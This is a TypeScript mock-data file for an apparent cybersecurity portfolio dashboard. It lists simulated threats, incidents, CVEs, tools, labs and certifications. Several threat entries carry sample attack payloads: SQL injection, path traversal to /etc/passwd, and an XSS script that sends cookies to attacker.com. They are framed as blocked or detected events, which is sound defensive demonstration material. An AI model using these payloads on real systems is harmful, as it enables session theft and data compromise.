import { 
  ThreatItem, IncidentItem, VulnerabilityItem, SecurityToolItem, 
  CyberProjectItem, CyberLabItem, CyberReportItem, CyberCertItem 
} from '../types/cybersecurity';

export const INITIAL_THREATS: ThreatItem[] = [
  {
    id: 'TRT-9041',
    type: 'SSH Brute-Force Attack',
    severity: 'CRITICAL',
    sourceIp: '185.220.101.5',
    targetSystem: 'auth-gateway-01.corp.local',
    timestamp: '2026-08-10 09:14:22',
    status: 'BLOCKED',
    detectionMethod: 'Suricata IDS / Splunk SIEM',
    payloadSample: 'PAM: 1,420 failed password attempts for user "root" from 185.220.101.5 in 30s',
    mitreTactic: 'T1110.001 - Password Guessing',
    description: 'High-frequency dictionary password guessing targeting SSH management port 22.'
  },
  {
    id: 'TRT-9042',
    type: 'SQL Injection Payload',
    severity: 'CRITICAL',
    sourceIp: '198.51.100.42',
    targetSystem: 'api.storefront.internal',
    timestamp: '2026-08-10 08:52:10',
    status: 'QUARANTINED',
    detectionMethod: 'ModSecurity WAF',
    payloadSample: 'POST /api/v1/auth/login HTTP/1.1 Body: username=admin\' UNION SELECT null,@@version--',
    mitreTactic: 'T1190 - Exploit Public-Facing Application',
    description: 'Union-based SQL injection attempt targeting authentication database endpoints.'
  },
  {
    id: 'TRT-9043',
    type: 'XSS Cross-Site Scripting Probe',
    severity: 'HIGH',
    sourceIp: '45.33.21.110',
    targetSystem: 'portal.clients.net',
    timestamp: '2026-08-10 08:12:05',
    status: 'BLOCKED',
    detectionMethod: 'Cloudflare WAF / SIEM Rule #1042',
    payloadSample: 'GET /search?q=<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
    mitreTactic: 'T1059.007 - JavaScript Execution',
    description: 'Reflected cross-site scripting payload attempting session cookie exfiltration.'
  },
  {
    id: 'TRT-9044',
    type: 'Directory Traversal Probe',
    severity: 'MEDIUM',
    sourceIp: '203.0.113.88',
    targetSystem: 'web-edge-02.dmz',
    timestamp: '2026-08-10 07:35:19',
    status: 'MONITORING',
    detectionMethod: 'Nginx Access Log Parser',
    payloadSample: 'GET /static/../../../../etc/passwd HTTP/1.1',
    mitreTactic: 'T1083 - File and Directory Discovery',
    description: 'Path traversal sequence trying to read sensitive local system configurations.'
  },
  {
    id: 'TRT-9045',
    type: 'DNS Tunnelling Beacon',
    severity: 'HIGH',
    sourceIp: '10.0.4.88',
    targetSystem: 'dns-resolver-primary',
    timestamp: '2026-08-10 06:40:00',
    status: 'INVESTIGATING',
    detectionMethod: 'Zeek Network Monitor',
    payloadSample: 'TXT query: a64f92bc01.c2.malicious-domain.xyz (high entropy query string)',
    mitreTactic: 'T1071.004 - DNS Command and Control',
    description: 'Abnormal high-frequency sub-domain query entropy indicating potential C2 data exfiltration.'
  }
];

export const INITIAL_INCIDENTS: IncidentItem[] = [
  {
    id: 'INC-2026-101',
    title: 'Suspicious Administrative Login on Domain Controller',
    severity: 'CRITICAL',
    status: 'INVESTIGATING',
    assignedAnalyst: 'Karan Pandre (Lead SOC Analyst)',
    detectionTime: '2026-08-10 08:30:00',
    lastUpdated: '2026-08-10 09:20:00',
    description: 'An off-hours administrative Kerberos ticket requests originated from an unmanaged workstation IP (10.0.12.45).',
    affectedAssets: ['DC-PRIMARY-01', 'AUTH-SRV-02', '10.0.12.45'],
    containmentSteps: [
      'Isolated workstation 10.0.12.45 from corporate VLAN via Cisco ISE.',
      'Revoked Domain Admin Kerberos TGT tickets for user domain_adm_02.',
      'Enforced step-up MFA for all privileged Active Directory sessions.'
    ],
    auditLogs: [
      { timestamp: '08:30:00', action: 'Event ID 4624 (An explicit credential logon) flagged by Splunk SIEM', author: 'System Alert' },
      { timestamp: '08:45:00', action: 'Initiated workstation network port quarantine on Cisco Core Switch', author: 'Karan Pandre' },
      { timestamp: '09:15:00', action: 'Volatile memory dump collected via FTK Imager for forensic triage', author: 'Karan Pandre' }
    ]
  },
  {
    id: 'INC-2026-098',
    title: 'Phishing Email Campaign with Malicious Macro Attachment',
    severity: 'HIGH',
    status: 'CONTAINED',
    assignedAnalyst: 'SOC Tier 2 Team',
    detectionTime: '2026-08-09 14:15:00',
    lastUpdated: '2026-08-09 17:00:00',
    description: 'Spoofed executive invoice notification sent to 24 finance staff containing enabled XLSM macros.',
    affectedAssets: ['Exchange-Online Mailboxes', 'EDR-Agent-Win10-09'],
    containmentSteps: [
      'Purged matching email Message-IDs from all inbox stores globally via PowerShell Compliance Search.',
      'Blocked sender domain "invoices-finance-update.com" on Cisco Email Security Appliance.',
      'CrowdStrike EDR killed spawned cmd.exe child process on endpoint Win10-09.'
    ],
    auditLogs: [
      { timestamp: '14:15:00', action: 'User reported suspicious email via Outlook PhishAlert button', author: 'User Reporter' },
      { timestamp: '14:30:00', action: 'Automated sandbox detonated payload: classified malware family QakBot', author: 'Wazuh Sandbox' },
      { timestamp: '16:00:00', action: 'Campaign fully remediated. Zero credential compromise observed.', author: 'Karan Pandre' }
    ]
  },
  {
    id: 'INC-2026-092',
    title: 'Unusual Outbound Traffic to Suspicious IP Block',
    severity: 'MEDIUM',
    status: 'RESOLVED',
    assignedAnalyst: 'Karan Pandre',
    detectionTime: '2026-08-07 11:00:00',
    lastUpdated: '2026-08-07 15:30:00',
    description: 'A staging web server initiated 4.2 GB file transfer via HTTPS to an external server in Eastern Europe.',
    affectedAssets: ['WEB-STAGING-04 (172.16.88.10)'],
    containmentSteps: [
      'Blocked external destination subnet on Palo Alto perimeter firewall.',
      'Identified root cause: Automated Jenkins backup script incorrectly pointed to public IP during test deployment.'
    ],
    auditLogs: [
      { timestamp: '11:00:00', action: 'Palo Alto NetFlow anomaly threshold trigger (>2GB outbound)', author: 'Firewall System' },
      { timestamp: '12:00:00', action: 'Audited Jenkins deployment logs and re-configured backup destination endpoint', author: 'DevOps & Karan Pandre' },
      { timestamp: '15:30:00', action: 'Closed incident as false positive / misconfiguration remediated.', author: 'Karan Pandre' }
    ]
  }
];

export const INITIAL_VULNERABILITIES: VulnerabilityItem[] = [
  {
    id: 'CVE-2024-3094',
    name: 'XZ Utils Backdoor Remote Code Execution',
    cvssScore: 10.0,
    severity: 'CRITICAL',
    affectedSystem: 'Linux Build Node - srv-build-03.dmz',
    detectionDate: '2026-08-01',
    remediationStatus: 'PATCHED',
    description: 'Malicious code inserted into XZ Utils versions 5.6.0 and 5.6.1 allowing unauthorized SSH authentication bypass.',
    cweCategory: 'CWE-506: Embedded Malicious Code',
    solutionLink: 'https://nvd.nist.gov/vuln/detail/CVE-2024-3094'
  },
  {
    id: 'CVE-2024-21626',
    name: 'runc Container Breakout & Filesystem Leak',
    cvssScore: 8.6,
    severity: 'HIGH',
    affectedSystem: 'Kubernetes Worker Pool - k8s-node-02',
    detectionDate: '2026-08-04',
    remediationStatus: 'MITIGATION_APPLIED',
    description: 'Internal file descriptor leak in runc allows containerized attacker processes to access host filesystem path.',
    cweCategory: 'CWE-200: Exposure of Sensitive Information',
    solutionLink: 'https://nvd.nist.gov/vuln/detail/CVE-2024-21626'
  },
  {
    id: 'CVE-2023-4863',
    name: 'Libwebp Heap Buffer Overflow in WebP Image Processing',
    cvssScore: 8.8,
    severity: 'HIGH',
    affectedSystem: 'Corporate Workstation Image Fleet (Win10/Linux)',
    detectionDate: '2026-08-06',
    remediationStatus: 'PATCHED',
    description: 'Heap buffer overflow in WebP image parsing engine leading to potential arbitrary code execution via crafted images.',
    cweCategory: 'CWE-122: Heap-based Buffer Overflow',
    solutionLink: 'https://nvd.nist.gov/vuln/detail/CVE-2023-4863'
  },
  {
    id: 'CVE-2023-38606',
    name: 'Apple iOS/macOS Kernel Privilege Escalation',
    cvssScore: 7.5,
    severity: 'MEDIUM',
    affectedSystem: 'Executive Mobile Devices',
    detectionDate: '2026-08-02',
    remediationStatus: 'PENDING_PATCH',
    description: 'Kernel vulnerability allowing an app with local access to modify sensitive kernel state bypasses.',
    cweCategory: 'CWE-269: Improper Privilege Management',
    solutionLink: 'https://nvd.nist.gov/vuln/detail/CVE-2023-38606'
  }
];

export const INITIAL_TOOLS: SecurityToolItem[] = [
  {
    id: 'tool-1',
    name: 'Splunk Enterprise SIEM',
    category: 'SIEM & Monitoring',
    purpose: 'Real-time log aggregation, SPL query writing, correlation rules, threat dashboarding & SOC triage.',
    skillLevel: 'Expert',
    status: 'In Portfolio',
    description: 'Configured indexing pipelines, built custom dashboard panels, and crafted SPL queries for threat hunting.'
  },
  {
    id: 'tool-2',
    name: 'Cisco Packet Tracer & IOS',
    category: 'Network Security',
    purpose: 'Simulating complex VLAN networks, router ACL configuration, firewall zone policies & packet inspection.',
    skillLevel: 'Expert',
    status: 'Certified',
    description: 'Virtual Internship completed via Cisco Networking Academy; built multi-VLAN campus infrastructure.'
  },
  {
    id: 'tool-3',
    name: 'Wireshark & TShark',
    category: 'Network Security',
    purpose: 'Deep packet inspection (DPI), PCAP analysis, TCP stream reconstruction & protocol anomaly identification.',
    skillLevel: 'Advanced',
    status: 'Practical Lab Usage',
    description: 'Analyzed malware pcap captures to detect command & control (C2) beaconing and unencrypted password leaks.'
  },
  {
    id: 'tool-4',
    name: 'Nmap & Masscan',
    category: 'Network Security',
    purpose: 'Network discovery, open port auditing, service version enumeration & OS detection.',
    skillLevel: 'Advanced',
    status: 'Practical Lab Usage',
    description: 'Executed stealth SYN scans, NSE script vulnerability checks, and automated subnet asset inventories.'
  },
  {
    id: 'tool-5',
    name: 'Burp Suite Professional',
    category: 'Offensive Security',
    purpose: 'Web application vulnerability testing, HTTP proxy intercept, Repeater/Intruder payload fuzzing.',
    skillLevel: 'Advanced',
    status: 'Practical Lab Usage',
    description: 'Tested OWASP Top 10 vulnerabilities (SQLi, XSS, CSRF, IDOR) in PortSwigger Web Security Academy.'
  },
  {
    id: 'tool-6',
    name: 'Wazuh EDR & OpenSearch',
    category: 'SIEM & Monitoring',
    purpose: 'Open-source security monitoring, host intrusion detection (HIDS), file integrity monitoring (FIM).',
    skillLevel: 'Intermediate',
    status: 'Practical Lab Usage',
    description: 'Deployed Wazuh manager nodes and connected endpoint agents to monitor Windows/Linux system logs.'
  },
  {
    id: 'tool-7',
    name: 'Microsoft Defender for Endpoint',
    category: 'Endpoint Security',
    purpose: 'Enterprise EDR threat telemetry, automated endpoint response, device isolation & malware quarantine.',
    skillLevel: 'Intermediate',
    status: 'Enterprise Deployment',
    description: 'Managed security baseline policies and investigated incident alerts in Microsoft 365 Defender portal.'
  },
  {
    id: 'tool-8',
    name: 'Kali Linux & Metasploit',
    category: 'Offensive Security',
    purpose: 'Penetration testing environment, exploit verification, payload creation & privilege escalation.',
    skillLevel: 'Advanced',
    status: 'Practical Lab Usage',
    description: 'Conducted penetration testing walkthroughs in TryHackMe and HackTheBox offensive labs.'
  }
];

export const INITIAL_PROJECTS: CyberProjectItem[] = [
  {
    id: 'proj-cyber-01',
    name: 'Enterprise SOC SIEM & Cisco IOS ACL Mitigation Engine',
    description: 'An interactive Security Operations Center (SOC) dashboard simulating Splunk log ingestion and automated Cisco Router Access Control List (ACL) rule generation.',
    objective: 'Demonstrate real-time threat detection, automated regex parsing, and instant network containment capabilities.',
    technologies: ['React', 'TypeScript', 'Tailwind CSS', 'Splunk SPL Engine', 'Cisco IOS CLI Parser'],
    tools: ['Splunk', 'Cisco Packet Tracer', 'Suricata IDS', 'Palo Alto Firewall'],
    architectureSummary: 'Real-Time Syslog Stream -> Regex Parsing Engine -> MITRE ATT&CK Triage -> Cisco Router ACL Rule Generator.',
    githubUrl: 'https://github.com/karanpandre',
    liveDemoUrl: 'https://karanpandre.dev',
    status: 'Completed',
    demonstratedSkills: [
      'SPL Query Optimization',
      'Cisco Extended ACL Syntax',
      'MITRE ATT&CK Framework Mapping',
      'Automated Incident Containment'
    ],
    keyOutcomes: [
      'Reduced simulated threat containment latency from 15 minutes to under 5 seconds.',
      'Mapped 100% of incoming log payloads to standard MITRE tactics and techniques.',
      'Generated copy-pasteable Cisco Router configuration blocks for immediate execution.'
    ]
  },
  {
    id: 'proj-cyber-02',
    name: 'Campus Network Security Architecture & VLAN Segmentation',
    description: 'Designed and simulated a multi-building university campus network featuring 4 segmented VLANs, inter-VLAN routing, and hardened perimeter firewalls.',
    objective: 'Isolate sensitive student data databases from guest Wi-Fi subnets and establish zero-trust access controls.',
    technologies: ['Cisco IOS', 'Packet Tracer', 'IEEE 802.1Q Trunking', 'DHCP Snooping'],
    tools: ['Cisco 2960 Switches', 'Cisco 2911 Routers', 'Cisco ASA Firewall'],
    architectureSummary: 'Core Router -> Distribution Switch -> Access Switches -> VLAN 10 (Admin), VLAN 20 (Faculty), VLAN 30 (Students), VLAN 40 (Guests).',
    githubUrl: 'https://github.com/karanpandre',
    status: 'Completed',
    demonstratedSkills: [
      'VLAN & Subnetting Architecture',
      'Port Security & MAC Binding',
      'Access Control Lists (ACL)',
      'DHCP & ARP Spoofing Defense'
    ],
    keyOutcomes: [
      'Successfully prevented cross-segment unauthorized ping sweeps across administrative subnets.',
      'Implemented Port Security limiting each switchport to 1 sticky MAC address.',
      'Achieved Cisco Virtual Cybersecurity Internship distinction.'
    ]
  }
];

export const INITIAL_LABS: CyberLabItem[] = [
  {
    id: 'lab-1',
    name: 'SOC Level 1 - Event Log Analysis & Triage',
    platform: 'TryHackMe',
    difficulty: 'Medium',
    category: 'SOC Analysis',
    dateCompleted: '2026-07-28',
    skillsPracticed: ['Windows Event Logs (4624, 4625, 4688)', 'Sysmon Process Creation', 'Splunk SPL Queries'],
    toolsUsed: ['Splunk', 'Event Viewer', 'Sysmon', 'CyberChef'],
    notes: 'Investigated a simulated lateral movement attempt involving psexec and remote PowerShell invocation.',
    status: 'Completed'
  },
  {
    id: 'lab-2',
    name: 'Web Security Academy - SQL Injection Deep Dive',
    platform: 'PortSwigger Academy',
    difficulty: 'Hard',
    category: 'Web Exploitation',
    dateCompleted: '2026-08-02',
    skillsPracticed: ['Union Attacks', 'Blind SQLi with Time Delays', 'Out-of-Band (OAST) SQLi'],
    toolsUsed: ['Burp Suite Pro', 'SQLmap', 'Python Request Scripts'],
    notes: 'Successfully extracted administrator password hashes from PostgreSQL database backend.',
    status: 'Completed'
  },
  {
    id: 'lab-3',
    name: 'Network Forensics - PCAP Packet Analysis',
    platform: 'HackTheBox',
    difficulty: 'Medium',
    category: 'Network Forensics',
    dateCompleted: '2026-08-05',
    skillsPracticed: ['Wireshark Display Filters', 'TLS Decryption with Key Log', 'DNS Tunnelling Identification'],
    toolsUsed: ['Wireshark', 'TShark', 'NetworkMiner'],
    notes: 'Reconstructed exfiltrated zip archive sent inside ICMP echo request data payloads.',
    status: 'Completed'
  }
];

export const INITIAL_REPORTS: CyberReportItem[] = [
  {
    id: 'rep-001',
    title: 'Executive Vulnerability Assessment & Threat Landscape Report',
    type: 'Vulnerability Assessment',
    author: 'Karan Pandre (Lead Analyst)',
    date: '2026-08-08',
    executiveSummary: 'Conducted comprehensive internal and external vulnerability assessment across 128 production systems. Identified 1 Critical vulnerability (XZ Utils CVE-2024-3094) and 2 High severity findings.',
    criticalFindingsCount: 1,
    highFindingsCount: 2,
    mediumFindingsCount: 4,
    status: 'Published',
    fullContent: `
# Executive Summary & Security Assessment Report

**Date:** August 8, 2026  
**Lead Auditor:** Karan Pandre, B.Tech IT  
**Scope:** Production Cloud Nodes, Perimeter Cisco Firewalls, and Internal Workstation Subnets.

---

### Key Findings Summary
1. **CRITICAL (CVSS 10.0):** XZ Utils Remote Code Execution Backdoor (CVE-2024-3094) detected on build worker node.  
   *Remediation:* Downgraded/patched XZ libraries immediately to version 5.4.5 across all Linux build environments.

2. **HIGH (CVSS 8.8):** WebP Image Processing Heap Buffer Overflow (CVE-2023-4863) found on 14 workstation endpoints.  
   *Remediation:* Pushed automated Group Policy / Microsoft Defender patch update.

3. **MEDIUM (CVSS 7.5):** Unencrypted HTTP management interfaces accessible on internal staging switches.  
   *Remediation:* Enforced HTTPS/SSH only and restricted web UI access to Admin Management VLAN 10.

---

### Conclusion & Security Posture Score
Overall organizational security posture evaluated at **94 / 100 (HIGH RESILIENCE)** with zero unmitigated critical vulnerabilities remaining active in production.
`
  },
  {
    id: 'rep-002',
    title: 'Phishing Campaign Post-Mortem & Incident Containment Review',
    type: 'Incident Post-Mortem',
    author: 'SOC Incident Response Team',
    date: '2026-08-09',
    executiveSummary: 'Post-incident analysis of QakBot phishing attempt. All 24 targeted email accounts were successfully remediated without data leakage or endpoint compromise.',
    criticalFindingsCount: 0,
    highFindingsCount: 1,
    mediumFindingsCount: 1,
    status: 'Published',
    fullContent: `
# Incident Post-Mortem: Phishing Campaign Remediation

**Incident ID:** INC-2026-098  
**Date:** August 9, 2026  
**Incident Lead:** Karan Pandre  

### Incident Timeline
- **14:15 UTC:** User alerted SOC tier 1 via Outlook PhishAlert plugin regarding an unexpected invoice attachment.
- **14:22 UTC:** Automated sandbox detonated XLSM macro payload, revealing QakBot C2 connection attempts.
- **14:35 UTC:** EDR automatically isolated affected host Win10-09 and killed child process cmd.exe.
- **15:00 UTC:** PowerShell compliance purge executed, removing 24 matching emails from Exchange Online mailboxes.

### Preventive Recommendations
- Lower macro execution permissions across finance group via GPO.
- Conduct simulated phishing exercise for finance staff within 30 days.
`
  }
];

export const INITIAL_CERTS: CyberCertItem[] = [
  {
    id: 'cert-1',
    title: 'Google Cybersecurity Professional Certificate',
    issuer: 'Google',
    issueDate: '2024',
    credentialId: 'GOOGLE-CYBER-2024-KP',
    credentialUrl: 'https://coursera.org/verify/google-cybersecurity',
    status: 'Active',
    progressPercentage: 100,
    skillsVerified: ['SIEM & Log Analysis', 'Python Automation', 'Linux & Bash Security', 'NIST Cybersecurity Framework']
  },
  {
    id: 'cert-2',
    title: 'Cisco Virtual Cybersecurity Internship & Packet Tracer',
    issuer: 'Cisco Networking Academy',
    issueDate: '2024',
    credentialId: 'CISCO-NET-2024-KP',
    credentialUrl: 'https://cisco.com/verify',
    status: 'Active',
    progressPercentage: 100,
    skillsVerified: ['Cisco IOS CLI', 'Access Control Lists (ACL)', 'VLAN Trunking (802.1Q)', 'Port Security']
  },
  {
    id: 'cert-3',
    title: 'IBM Operating System Security & Administration',
    issuer: 'IBM',
    issueDate: '2024',
    credentialId: 'IBM-OSSEC-2024-KP',
    status: 'Active',
    progressPercentage: 100,
    skillsVerified: ['OS Hardening', 'User Privilege Management', 'Patch Audit', 'System Call Tracing']
  },
  {
    id: 'cert-4',
    title: 'Cisco Certified Network Associate (CCNA 200-301)',
    issuer: 'Cisco Systems',
    issueDate: 'Expected 2026',
    status: 'In Progress',
    progressPercentage: 85,
    skillsVerified: ['IP Routing (OSPF)', 'Spanning Tree Protocol', 'IP Services', 'Network Security Fundamentals']
  },
  {
    id: 'cert-5',
    title: 'CompTIA Security+ (SY0-701)',
    issuer: 'CompTIA',
    issueDate: 'Target Q4 2026',
    status: 'Target',
    progressPercentage: 60,
    skillsVerified: ['Threat Architecture', 'Cryptographic Controls', 'Risk Management', 'Security Governance']
  }
];

export const CHART_THREAT_ACTIVITY = [
  { time: '00:00', threats: 12, blocked: 12 },
  { time: '03:00', threats: 8, blocked: 8 },
  { time: '06:00', threats: 25, blocked: 24 },
  { time: '09:00', threats: 84, blocked: 82 },
  { time: '12:00', threats: 110, blocked: 108 },
  { time: '15:00', threats: 65, blocked: 65 },
  { time: '18:00', threats: 42, blocked: 41 },
  { time: '21:00', threats: 18, blocked: 18 }
];

export const CHART_SEVERITY_DISTRIBUTION = [
  { name: 'Critical', value: 15, color: '#f43f5e' },
  { name: 'High', value: 35, color: '#f59e0b' },
  { name: 'Medium', value: 30, color: '#3b82f6' },
  { name: 'Low', value: 20, color: '#10b981' }
];

export const CHART_ATTACK_CATEGORIES = [
  { category: 'Brute Force', count: 420 },
  { category: 'SQL Injection', count: 280 },
  { category: 'XSS Probe', count: 190 },
  { category: 'Phishing', count: 140 },
  { category: 'Port Scan', count: 310 },
  { category: 'DNS Tunnel', count: 65 }
];
